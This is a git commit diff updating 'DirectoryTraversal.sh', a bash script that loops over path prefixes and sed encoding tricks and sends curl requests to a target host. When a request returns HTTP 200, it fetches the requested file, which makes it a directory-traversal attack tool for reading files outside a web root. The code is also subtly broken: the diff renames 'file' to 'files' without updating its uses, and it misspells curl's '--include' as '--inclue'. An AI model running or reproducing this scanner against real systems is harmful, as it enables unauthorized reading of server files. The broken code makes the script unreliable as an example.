c49607bc38e4bd8f503583412e9f7d7f6de849a5
Cap3ya <72896024+Cap3ya@users.noreply.github.com>
2020-12-12 10:14:35 +0100

    Update DirectoryTraversal.sh

--- DirectoryTraversal/DirectoryTraversal.sh
+++ DirectoryTraversal/DirectoryTraversal.sh
@@ -1,15 +1,15 @@
 #!/bin/bash
 dns=$1
 paths=paths.txt
-file=$2
+files=$2
 translations=translations.txt
 
 for translation in $(cat $translations)
 	do
 		for path in $(cat $paths)
 		do
-			data="--silent --head $dns$path$file"
-			curl $(echo $data | sed $translation) | tac | tac | grep -E '\\<200>\\' > /dev/null \
+			data=$(echo $dns$path$file | sed $translation)
+			curl --silent --head $data | grep -E '\<200>\' > /dev/null \
 			       && curl --inclue $dns$path$file 2> /dev/null
 		done
 	done
